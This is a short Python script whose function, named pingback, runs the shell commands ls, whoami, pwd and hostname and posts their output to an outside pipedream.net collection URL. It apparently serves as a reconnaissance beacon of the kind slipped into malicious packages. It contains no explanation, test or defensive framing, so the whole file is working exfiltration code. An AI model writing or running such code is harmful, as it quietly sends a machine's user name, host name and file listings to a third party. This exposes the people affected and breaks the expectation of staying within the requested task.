import os
import requests

def pingback():
    url = "https://eofu0ntgqm9ibyz.m.pipedream.net"
    data = {
        "ls": os.popen("ls").read(),
        "whoami": os.popen("whoami").read(),
        "pwd": os.popen("pwd").read(),
        "hostname": os.popen("hostname").read()
    }
    requests.post(url, json=data)

if __name__ == "__main__":
    pingback()
